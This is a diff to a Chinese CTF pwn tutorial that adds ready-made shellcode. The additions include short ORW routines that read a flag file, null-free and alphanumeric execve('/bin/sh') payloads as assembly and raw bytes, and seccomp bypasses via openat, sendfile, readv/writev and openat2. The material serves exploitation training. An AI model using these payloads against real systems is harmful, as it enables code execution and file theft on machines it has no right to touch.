@@ -178,4 +178,292 @@ xor al, 0x7a
 payload = (b"\x00\xc0"+asm(shellcode)).ljust(0x100-3, b"\x90")+b"\x0e\x04"
 ```
 
-详细解释见
+详细解释见[这里的自改变shellcode](https://github.com/maple-pwn/for_fresher/blob/main/pwn/wp/whuctf2025/wp.md)
+
+### orw
+
+**自动生成**
+
+pwntool里有自己的orw生成，但是字节比较长，一般情况下都不太合适,仅作参考
+
+这里是buuctf第45题pwnable_orw题解中摘取的
+
+```python
+bss = 0x804A060
+shellcode = shellcraft.open('flag')
+shellcode+=shellcraft.read('eax',bss+100,100)
+shellcode+=shellcraft.write(1,bss+100,100)
+payload = asm(shellcode)
+```
+
+长度为0x36字节
+
+**短字节**
+
+所以这里一般使用另一种总计0x28字节，要求:
+
+- rsp指向的地址必须可用
+- 存在NULL字符（不存在\x00导致截断）
+- 不可指定地址
+
+```assembly
+// rdx为写入数量
+mov rdx, 0x200
+push 0x67616c66
+mov rdi,rsp
+xor esi,esi  #如果本来rsi=0，可以删掉这句
+mov eax,2
+syscall
+mov edi,eax
+mov rsi,rsp
+xor eax,eax
+syscall
+xor edi,2  
+mov eax,edi
+syscall  
+```
+
+bytes:
+
+```assembly
+\x48\xc7\xc2\x00\x02\x00\x00\x68\x66\x6c\x61\x67\x48\x89\xe7\x31\xf6\xb8\x02\x00\x00\x00\x0f\x05\x89\xc7\x48\x89\xe6\x31\xc0\x0f\x05\x83\xf7\x02\x89\xf8\x0f\x05
+```
+
+**可指定地址**
+
+```python
+shellcode = """
+xor rdx,rdx
+mov dh, 0x2
+mov rdi,{}
+xor esi,esi  
+mov eax,2
+syscall
+mov rsi,rdi
+mov edi,eax
+xor eax,eax
+syscall
+xor edi,2
+mov eax,edi
+syscall
+""".format(hex(target_addr + 0xb0))
+```
+
+长度比0x90大
+
+## 书写更短的shellcode
+
+前面在基础shellcode的书写中已经说过很多了，这里主要提几个tip
+
+### 使用残留寄存器
+
+依旧是用tgctf2025的shellcode举例，动调发现寄存器除了rdi外全部清空，且限制0x12字节
+
+但是可以发现我们写入的指令最后被rdi指向，所以可以构造出合适的短shellcode
+
+```python
+shellcode = asm('''
+mov rdi,0xa
+add rax,0x3b
+syscall
+''')
+payload = shellcode+b'/bin/sh\x00'
+```
+
+### 特殊指令的使用
+
+- cwd系列:
+
+  - `CWD`: `AX`符号位拓展到`DX`
+
+  - `CDQ`: `EAX`符号位拓展到`EDX`⭐
+  - `CQO`：`RAX`符号位拓展到`RDX`
+  - `CBW`: `AL`符号位拓展到`DX`
+
+### 寄存器复用
+
+## 书写受限制的shellcode
+
+### 字符限制
+
+一般是**坏字符（\x00)**,**syscall过滤（\x05\x0f)**,**可见字符**
+
+可见字符和syscall过滤前面已经说过了
+
+坏字符过滤的话可以直接去[这里](https://shell-storm.org/shellcode/index.html)找不含\x00的shellcode
+
+注意，这里的坏字符过滤可能是“”无心“”过滤掉的，例如strcpy遇见‘\x00’就结束了，所以我们需要特定的shellcode
+
+```assembly
+xor ecx, ecx
+mul ecx
+push ecx
+push 0x68732f2f
+push 0x6e69622f
+mov ebx, esp
+mov al, 11
+int 0x80
+```
+
+```assembly
+xor    rsi, rsi
+push   rsi
+mov    rdi, 0x68732f2f6e69622f
+push   rdi
+push   rsp
+pop    rdi
+mov    al, 0x3b
+cdq    
+syscall
+```
+
+共22字节数（其实和上面最短shellcode一样的）
+
+```python
+b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05"
+```
+
+```python
+b"Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t"
+```
+
+### 特定位置限制
+
+这里有几个思路
+
+- 利用read函数再次读入，且将读入地址写为合适地址，这种适合给定的shellcode长度比较短
+
+  `ssize_t read(int fd, void *buf, size_t count)`
+
+  | 参数  | 对应寄存器 | 作用                      |
+  | ----- | ---------- | ------------------------- |
+  | fd    | rdi        | 0表示从用户输入的值中读取 |
+  | buf   | rsi        | 输入到的地址              |
+  | count | rdx        | 输入的长度                |
+
+- 利用mprotect重新为特定地址申请权限
+
+  `int mprotect(void *addr, size_t len, int prot)`
+
+  | 参数 | 对应寄存器 | 作用                  |
+  | ---- | ---------- | --------------------- |
+  | addr | rdi        | 内存起始地址          |
+  | len  | rsi        | 处理的长度            |
+  | proc | rdx        | 保护（1为r,2为w,4为x) |
+
+## seccomp绕过
+
+#### level1 开放open,read,write
+
+```assembly
+push   0x67616c66
+mov    rdi, rsp
+xor    esi, esi
+push   0x2
+pop    rax
+syscall 
+mov    rdi, rax
+mov    rsi, rsp
+mov    edx, 0x100
+xor    eax, eax
+syscall 
+mov    edi, 0x1
+mov    rsi, rsp
+push   0x1
+pop    rax
+syscall
+```
+
+#### level2 关闭open
+
+```assembly
+mov rax,0x0067616c662f
+push rax
+mov rsi,rsp
+xor rdx,rdx
+mov rax,257
+syscall
+xor rdi,rdi
+inc rdi
+mov rsi,rax
+xor rdx,rdx
+mov r10,0x100 # 读取文件的长度,不够就加
+mov rax,40
+syscall
+```
+
+```python
+b'H\xb8/flag\x00\x00\x00PH\x89\xe6H1\xd2H\xc7\xc0\x01\x01\x00\x00\x0f\x05H1\xffH\xff\xc7H\x89\xc6H1\xd2I\xc7\xc2\x00\x01\x00\x00H\xc7\xc0(\x00\x00\x00\x0f\x05'
+```
+
+#### level3 openat readv writev
+
+```assembly
+mov rax,0x0067616c662f
+push rax
+mov rsi,rsp
+xor rdx,rdx
+mov rax,257
+syscall
+mov rdi,rax
+push 0x100 # 读入大小由这个控制
+mov rbx,rsp
+sub rbx,0x108 # 为读入大小加8
+push rbx
+mov rsi,rsp
+mov rdx,1
+mov rax,19
+syscall
+mov rdi,1
+mov rsi,rsp
+mov rdx,1
+mov rax,20
+syscall
+```
+
+```python
+b'H\xb8/flag\x00\x00\x00PH\x89\xe6H1\xd2H\xc7\xc0\x01\x01\x00\x00\x0f\x05H\x89\xc7h\x00\x01\x00\x00H\x89\xe3H\x81\xeb\x08\x01\x00\x00SH\x89\xe6H\xc7\xc2\x01\x00\x00\x00H\xc7\xc0\x13\x00\x00\x00\x0f\x05H\xc7\xc7\x01\x00\x00\x00H\x89\xe6H\xc7\xc2\x01\x00\x00\x00H\xc7\xc0\x14\x00\x00\x00\x0f\x05'
+```
+
+#### level3.5 openat2 read write
+
+```assembly
+mov rax, 0x67616c66 # 路径
+push rax
+xor rdi, rdi
+sub rdi, 100
+mov rsi, rsp
+push 0
+push 0
+push 0
+mov rdx, rsp
+mov r10, 0x18
+push SYS_openat2 # pwntools预定义的系统调用号,也可以手动查
+pop rax
+syscall
+mov rdi,rax
+mov rsi,rsp
+mov edx,0x100
+xor eax,eax
+syscall
+mov edi,1
+mov rsi,rsp
+push 1
+pop rax
+syscall
+```
+
+```python
+b'H\xc7\xc0flagPH1\xffH\x83\xefdH\x89\xe6j\x00j\x00j\x00H\x89\xe2I\xc7\xc2\x18\x00\x00\x00h\xb5\x01\x00\x00X\x0f\x05H\x89\xc7H\x89\xe6\xba\x00\x01\x00\x001\xc0\x0f\x05\xbf\x01\x00\x00\x00H\x89\xe6j\x01X\x0f\x05'
+```
+
+## Tips
+
+- 有些题目对shellcode的检查可能用到了strlen或别的什么str类型函数，这个时候可以直接在shellcode前加一个\x00起手的指令，绕过判断
+
+- 在无法获取shellcode运行地址时，可以运行syscall，运行后，rcx会被改写为下一条指令的地址
+
+  - 在32位程序中，还可以通过call指令获取将运行地址压入栈中
+  - 在64位地址中，可以直接通过 `lea rax, [rip]` 来获取rip地址
+
+  
